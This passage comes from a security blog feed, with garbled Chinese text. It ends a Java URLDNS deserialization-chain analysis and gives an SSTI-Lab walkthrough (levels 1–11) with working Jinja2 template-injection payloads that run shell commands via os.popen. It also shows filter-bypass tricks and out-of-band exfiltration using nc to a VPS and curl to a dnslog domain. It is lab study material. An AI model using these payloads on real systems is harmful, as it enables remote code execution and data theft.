class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)<span class="comment">//å…ˆåˆ¤æ–­è¯¥URLçš„hostAddresså±æ€§æ˜¯å¦å·²ç»æœ‰å€¼äº†</span></span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;<span class="comment">//å¦‚æœå·²æœ‰å€¼ï¼Œç›´æ¥è¿”å›</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();<span class="comment">//è·å–Host</span></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);<span class="comment">//è·å–IPåœ°å€ï¼Œå¹¶æŠŠå€¼èµ‹ç»™URLçš„hostAddress</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºï¼Œå¦‚æœä½ ä¹‹å‰å·²ç»è®¿é—®è¿‡dnsçš„åŸŸåé‚£ä¹ˆå°±ä¸ä¼šå‡ºå‘ç¬¬äºŒæ¬¡ï¼Œæˆ‘å°±æ˜¯å› ä¸ºè¿™ä¸ªå¡äº†åŠå¤©è¿˜ä»¥ä¸ºä»£ç æœ‰é—®é¢˜ï¼Œæœ€ååœ¨ä¸‹é¢è¿™é‡Œå‘èµ·DNSè¯·æ±‚<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244816.png" alt="image-20230423224452776"><br>åé¢å…·ä½“æ€ä¹ˆå‘èµ·è¯·æ±‚å¯å‚è€ƒ<a href="https://leihehe.top/2021/11/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/">Javaååºåˆ—åŒ–æ¼æ´ä¹‹URLDNSåˆ©ç”¨é“¾(7) | LeiH - Blog (leihehe.top)</a><br>æ‰§è¡Œç¨‹åºå¯çœ‹åˆ°è¯·æ±‚æˆåŠŸ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232245550.png" alt="image-20230423224502505"></p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><blockquote><p>HashMap.readObject()-&gt;HashMap.putVal()-&gt;HashMap.hash()-&gt;URL.hashCode()</p></blockquote><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è™½ç„¶è¿™æ˜¯Javaååºåˆ—åŒ–æœ€ç®€å•çš„ä¸€æ¡é“¾ä½†æ˜¯æˆ‘ä¸€ç‚¹éƒ½æ²¡æ„Ÿè§‰è½»æ¾ï¼Œæ‰€ä»¥è¿™ç¯‡åˆ†æè¿˜æœ‰å¾ˆå¤šä¸è¶³ä¹‹å¤„ï¼Œæ„Ÿè§‰è‡ªå·±æ‰‹å†™åˆ†æä¹‹åå†å»çœ‹ysoserialä¸Šçš„URLDNSé“¾ä¼šè½»æ¾å¾ˆå¤šï¼Œä¸€å¼€å§‹ç›´æ¥æ‹¿é‚£ä¸ªé“¾åˆ†æä¸€ç›´æ²¡è¿›åº¦</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSTI-Lab</title>
      <link href="/2023/03/SSTI-Lab/"/>
      <url>/2023/03/SSTI-Lab/</url>
      
        <content type="html"><![CDATA[<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>å‰é¢çš„è¯•æ¢å°±ä¸å¼„äº†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è¯•ä¸€ä¸‹çœ‹è‡ªå·±ç¯å¢ƒæœ‰æ²¡æœ‰é—®é¢˜<br>å…ˆç»™å‡ºpayloadï¼š<code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[143].__init__.__globals__['popen']("type flag").read()&#125;&#125;</code><br>è¿™é‡Œæ‰¾çš„æ˜¯<code>os._wrap_close</code>é€šè¿‡è„šæœ¬æœç´¢ä¸‹æ ‡ä¸º143ï¼Œåˆå§‹åŒ–ä¹‹åå¯ä»¥ä½¿ç”¨popenæ¥æ‰“å¼€flagï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç‚¹å¡äº†æˆ‘å¾ˆä¹…ï¼Œå°±æ˜¯<code>&quot;type flag&quot;</code>æˆ‘ä¸€ç›´ä½¿ç”¨<code>&quot;cat flag&quot;</code>å¾—ä¸åˆ°flagï¼Œè€Œæˆ‘ä¸€å¼€å§‹æ˜¯ä¸çŸ¥é“typeè¿™ä¸ªå‘½ä»¤çš„ï¼Œçœ‹åˆ°<a href="https://www.o2takuxx.com/index.php/2022/09/20/ssti-labs%e9%9d%b6%e5%9c%ba/">SSTI-Labsé¶åœº - o2takuXX ã® blogo2takuXX ã® blog</a>è¿™ç¯‡åšå®¢æ‰çŸ¥é“typeå‘½ä»¤<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272011836.png" alt="image-20230327201121406"><br>é€šè¿‡GPTçš„å›ç­”åº”è¯¥æ˜¯ç”±äºæˆ‘åœ¨Windowsä¸‹éƒ¨ç½²çš„ç¯å¢ƒå¯¼è‡´çš„é—®é¢˜ï¼Œæœ€ç»ˆä½¿ç”¨typeå¾—åˆ°flag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272011503.png" alt="image-20230327201153225"><br>å½“ç„¶å¯ä»¥ç”¨çš„æ¨¡å—å¾ˆå¤šï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ç½‘ä¸Šå…¶å®ƒåšä¸»çš„wpï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†<code>&#123;&#123;`å¯ä»¥ç”¨`&#123;% %&#125;`æ¥ç»•è¿‡ï¼Œ`&#123;% %&#125;`ç”¨äºæ‰§è¡Œpythonä»£ç æ‰€ä»¥ç›´æ¥printä¸€ä¸‹å°±è¡Œpayloadï¼š`&#123;%print("".__class__.__bases__[0].__subclasses__()[143].__init__.__globals__['popen']("type flag").raead())%&#125;`![image-20230327201213126](https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012396.png)è¿™é‡Œä¹Ÿæ”¾ä¸€ä¸‹importæ–¹æ³•å®ç°ä¾¿äºæˆ‘è‡ªå·±ä»¥åæŸ¥çœ‹ï¼Œåœ¨`_frozen_importlib._ModuleLock`æ¨¡å—ä¸­æœ‰importæ–¹æ³•ï¼Œæœç´¢ä¸‹æ ‡ä¸º100payloadï¼š`&#123;%print(''.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__['__import__']('os').popen("type flag").read())%&#125;`è¿™ç§æ–¹æ³•æ˜¯é€šè¿‡importæ–¹æ³•å¯¼å…¥osæ¨¡å—æ‰§è¡Œpopenå‡½æ•°æ¥å®ç°çš„## level 3è¿™ä¸€å…³æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡å¤–å¸¦åˆ°vpsæ¥å¾—åˆ°flagï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨dnslogå…ˆçœ‹å¤–å¸¦åˆ°vps`&#123;&#123;''.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__['__builtins__'].eval("__import__('os').popen('type flag|nc vps port').read()")&#125;&#125;</code><br>åŒæ ·æ˜¯åˆ©ç”¨<code>_frozen_importlib._ModuleLock</code>æ¨¡å—ä¸­çš„æ–¹æ³•ä½†æ˜¯è¿™é‡Œå°±å¤šäº†ä¸€ä¸ª<code>__builtins__</code>è¿™ä¸ªæ¨¡å—è¿”å›ä¸€ä¸ªç”±å†…å»ºå‡½æ•°ï¼ˆå³pythonè‡ªå¸¦å‡½æ•°ï¼‰å‡½æ•°åç»„æˆçš„åˆ—è¡¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012454.png" alt="image-20230327201230329"><br>ç†è§£è¿™ä¸ªæ–¹æ³•æ‰§è¡Œå°±å¯ä»¥çœ‹æ‡‚payloadäº†ï¼Œå‰é¢çš„åŸç†æ²¡å˜ï¼Œ<code>__builtins__</code>æ˜¯objectçš„ä¸€ä¸ªå­ç±»ï¼Œæ‰€ä»¥å‰é¢å¯¼å…¥äº†objectå°±å¯ä»¥æœå¯»åˆ°<code>__builtins__</code>å°±ç›¸å½“äºå¯¼å…¥äº†ï¼Œevalæ˜¯å†…ç½®å‡½æ•°æ‰€ä»¥<code>__builtins__</code>å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œç„¶åå¯¼å…¥osæ¨¡å—ï¼Œ<code>type flag</code>å…ˆæ‰¾åˆ°flagç›®å½•é€šè¿‡ncå‘½ä»¤è¾“å‡ºåˆ°è‡ªå·±çš„vpsä¸Šï¼ŒWindowsä¸‹éœ€è¦è‡ªå·±å®‰è£…ä¸€ä¸‹ncå‘½ä»¤ï¼Œè¿™æ—¶å€™çœŸæ„Ÿè§‰å°†ç¯å¢ƒéƒ¨ç½²åˆ°Linuxä¸‹æ–¹ä¾¿å¾ˆå¤š<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012421.png" alt="image-20230327201251069"><br>ç„¶åçœ‹ä¸€ä¸‹å¤–å¸¦åˆ°dnslogä¸Šçš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://`type flag`.ou7jiq.dnslog.cn&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠ¥é”™äº†ï¼Œæ²¡è§£å†³å…ˆæ”¾ç€<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013947.png" alt="image-20230327201306652"></p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†<code>[]</code>ä½¿ç”¨éå†æ¥ç»•è¿‡ï¼Œé…åˆ<code>__getitem__</code>é­”æœ¯æ–¹æ³•è¿›è¡Œå–å€¼<br>payloadï¼š<code>&#123;% for i in ''.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__=='Popen' %&#125;&#123;&#123; i.__init__.__globals__.__getitem__('os').popen('type flag').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br>è¿™ä¸ªpayloadçš„å‰åŠéƒ¨åˆ†ç›¸å½“äº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> i.__name__==<span class="string">&#x27;Popen&#x27;</span></span><br><span class="line">    éœ€è¦æ‰§è¡Œçš„å†…å®¹</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œpayloadå¾—åˆ°flag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013616.png" alt="image-20230327201322430"></p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†å•åŒå¼•å·ï¼Œä½¿ç”¨requestè¿›è¡Œç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">request              #request.__init__.__globals__[&#x27;__builtins__&#x27;]</span><br><span class="line">request.args.x1    #getä¼ å‚</span><br><span class="line">request.values.x1  #æ‰€æœ‰å‚æ•°</span><br><span class="line">request.cookies      #cookieså‚æ•°</span><br><span class="line">request.headers      #è¯·æ±‚å¤´å‚æ•°</span><br><span class="line">request.form.x1    #postä¼ å‚(Content-Type:applicaation/x-www-form-urlencodedæˆ–                             multipart/form-data)</span><br><span class="line">request.data   #postä¼ å‚(Content-Type:a/b)</span><br><span class="line">request.json #postä¼ json  (Content-Type: application/json)</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹payloadä¸€ä¸‹å°±èƒ½ç†è§£äº†<br>getï¼š<code>?arg1=__builtins__&amp;arg2=__import__(&#39;os&#39;).popen(&#39;type flag&#39;).read()</code><br>postï¼š<code>code=&#123;&#123;().__class__.__base__.__subclasses__()[100].__init__.__globals__[request.values.arg1].eval(request.values.arg2)&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013900.png" alt="image-20230327201347018"></p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>è¿‡æ»¤äº†ä¸‹åˆ’çº¿<code>_</code>ä½¿ç”¨<code>|attr</code>è¿‡æ»¤å™¨ï¼Œç±»ä¼¼äºLinuxä¸­çš„ç®¡é“ç¬¦<code>|</code>ç”¨å‰é¢çš„è¾“å‡ºä½œä¸ºåé¢çš„æ“ä½œå¯¹è±¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;|attr(&quot;__class__&quot;)</span><br><span class="line">ç›¸å½“äº</span><br><span class="line">&quot;&quot;.__class__</span><br></pre></td></tr></table></figure><p>getï¼š<code>?arg1=__init__&amp;arg2=__globals__&amp;arg3=__getitem__&amp;arg4=__builtins__&amp;arg5=__import__(&#39;os&#39;).popen(&#39;type flag&#39;).read()</code><br>postï¼š<code>code=&#123;&#123;(x|attr(request.values.arg1)|attr(request.values.arg2)|attr(request.values.arg3))(request.values.arg4).eval(request.values.arg5)&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281056075.png" alt="image-20230327205244185"></p><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>è¿‡æ»¤äº†ç‚¹<code>.</code>ä½¿ç”¨ä¸­æ‹¬å·è¿›è¡Œç»•è¿‡æ¥æ‹¼æ¥å› ä¸ºç‚¹çš„åŠŸèƒ½å°±æ˜¯æ‹¼æ¥ä¸­æ‹¬å·ä¹Ÿæœ‰è¿™ä¸€åŠŸèƒ½<br>å°†å‰é¢çš„payloadæ”¹å†™ä¸€ä¸‹<br><code>&#123;&#123;''.__class__.__base__.__subclasses__()[100].__init__.__globals__['__import__']('os').popen("type flag").read()&#125;&#125;</code><br>ç„¶åç”¨ä¸­æ‹¬å·å°†ç‚¹æ›¿æ¢<br><code>&#123;&#123;''['__class__']['__base__']['__subclasses__']()[100]['__init__']['__globals__']['__import__']('os')['popen']("type flag")['read']()&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057996.png" alt="image-20230327202039586"></p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>è¿™å…³è¿‡æ»¤äº†ä¸€å †å…³é”®å­—ï¼Œæœ¬æ¥æƒ³fuzzä¸€ä¸‹ä½†æ˜¯æ²¡æ‰¾åˆ°å­—å…¸ç›´æ¥çœ‹wpçš„å§<br><code>&quot;class&quot;, &quot;arg&quot;, &quot;form&quot;, &quot;value&quot;, &quot;data&quot;, &quot;request&quot;, &quot;init&quot;, &quot;global&quot;, &quot;open&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;attr&quot;</code><br>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡<br><code>&#123;&#123;''['__cla''ss__']['__ba''se__']['__subcla''sses__']()[100]['__in''it__']['__glo''bals__']['__import__']('os')['pop''en']("type flag")['read']()&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057747.png" alt="image-20230328105734102"></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>è¿‡æ»¤äº†æ•°å­—å³é™åˆ¶ç´¢å¼•ä½¿ç”¨<code>__getitem__</code>ç»•è¿‡<br>payloadï¼š<code>&#123;&#123;x.__init__.__globals__.__getitem__('__builtins__').eval("__import__('os').popen('type flag').read()")&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057504.png" alt="image-20230328105751445"><br>ä½¿ç”¨lipsumï¼Œflaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°<code>__builtins__</code>ï¼Œè€Œä¸”<code>lipsum.__globals__</code>å«æœ‰osæ¨¡å—ï¼š<code>&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;</code></p><p>payloadï¼š<code>&#123;&#123;lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("type flag")|attr("read")()&#125;&#125;</code><br>ä¹Ÿèƒ½æ‰“é€š</p><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>è¯¥é¢˜wafï¼š<code>set config = None</code>ï¼Œç›®æ ‡æ˜¯å¾—åˆ°configå³é…ç½®æ–‡ä»¶è€Œä¸æ˜¯flag<br>è¿™é¢˜å¯ä»¥é€šè¿‡url_for()æˆ–è€…get_flashed_messages()æ–¹æ³•é…åˆ<br><strong>url_for()</strong> â€”- flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”<code>url_for.__globals__[&#39;__builtins__&#39;]</code>å«æœ‰<code>current_app</code></p><p><strong>get_flashed_messages()</strong> â€”- flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”<code>url_for.__globals__[&#39;__builtins__&#39;]</code>å«æœ‰<code>current_app</code></p><p><strong>current_app</strong> â€”- åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚<br>payloadï¼š  <code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058523.png" alt="image-20230328105809669"><br>å¾ˆå¥‡æ€ªè¿™é‡Œåˆ©ç”¨url_for()å¤±è´¥äº†</p><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†å•å¼•å·<code>&#39;</code> åŒå¼•å·<code>&quot;</code> åŠ å·<code>+</code> å…³é”®å­—<code>request</code> ç‚¹å·<code>.</code> æ–¹æ‹¬å·<code>[]</code><br>æ„Ÿè§‰è¿™å…³è¿˜æ˜¯æŒºéš¾çš„<br>å…ˆçœ‹ä¸€äº›è¿‡æ»¤å™¨å§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">å¸¸ç”¨çš„è¿‡æ»¤å™¨</span><br><span class="line"></span><br><span class="line">int()ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›</span><br><span class="line"></span><br><span class="line">float()ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›</span><br><span class="line"></span><br><span class="line">lower()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›</span><br><span class="line"></span><br><span class="line">upper()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›</span><br><span class="line"></span><br><span class="line">title()ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›</span><br><span class="line"></span><br><span class="line">capitalize()ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›</span><br><span class="line"></span><br><span class="line">trim()ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›</span><br><span class="line"></span><br><span class="line">wordcount()ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›</span><br><span class="line"></span><br><span class="line">reverse()ï¼šå­—ç¬¦ä¸²åè½¬ï¼›</span><br><span class="line"></span><br><span class="line">replace(value,old,new)ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">striptags()ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›</span><br><span class="line"></span><br><span class="line">escape()æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†&lt;ã€&gt;ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚</span><br><span class="line"></span><br><span class="line">safe()ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;ï¼›</span><br><span class="line"></span><br><span class="line">list()ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›</span><br><span class="line"></span><br><span class="line">string()ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">join()ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›</span><br><span class="line"></span><br><span class="line">abs()ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›</span><br><span class="line"></span><br><span class="line">first()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›</span><br><span class="line"></span><br><span class="line">last()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;å°†è¾“å‡ºï¼šHelloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›</span><br><span class="line"></span><br><span class="line">sum()ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›</span><br><span class="line"></span><br><span class="line">sort()ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default(&#x27;xiaotuo&#x27;)----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚</span><br><span class="line"></span><br><span class="line">length()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯count</span><br></pre></td></tr></table></figure><p>å…ˆç¡®å®šä¸€ä¸ªåˆ©ç”¨çš„payload<br><code>&#123;&#123;lipsum.__globals__.get('os').popen('type flag').read()&#125;&#125;</code><br>ç„¶åå°±æ˜¯é€šè¿‡setè®¾ç½®å˜é‡æ­é…joinè¿›è¡Œæ›¿æ¢ç»•è¿‡<br>é€šè¿‡<code>&#123;&#123;lipsum|string|list&#125;`è·å¾—ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œç„¶åé€šè¿‡popå‡½æ•°å¯ä»¥å–å‡ºä½¿ç”¨<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello [&#x27;&lt;&#x27;, &#x27;f&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27; &#x27;, &#x27;g&#x27;, &#x27;e&#x27;, &#x27;n&#x27;, &#x27;e&#x27;, &#x27;r&#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;_&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;m&#x27;, &#x27;_&#x27;, &#x27;i&#x27;, &#x27;p&#x27;, &#x27;s&#x27;, &#x27;u&#x27;, &#x27;m&#x27;, &#x27; &#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27; &#x27;, &#x27;0&#x27;, &#x27;x&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;8&#x27;, &#x27;3&#x27;, &#x27;3&#x27;, &#x27;A&#x27;, &#x27;3&#x27;, &#x27;F&#x27;, &#x27;E&#x27;, &#x27;D&#x27;, &#x27;4&#x27;, &#x27;0&#x27;, &#x27;&gt;&#x27;]</span><br></pre></td></tr></table></figure>ä½¿ç”¨`|attr`å°†`.`æ›¿æ¢ï¼Œå¾—åˆ°`&#123;&#123;lipsum|attr("__globals__")|attr("get")("os")|attr("popen")("type flag")|attr("read")()&#125;&#125;</code><br>ç„¶åæ„é€ å­—ç¬¦ç»•è¿‡å¼•å·é™åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1) | join %&#125;</span><br><span class="line">&#123;% set o=dict(os=1) | join %&#125;</span><br><span class="line">&#123;% set p=dict(popen=1) |join %&#125;</span><br><span 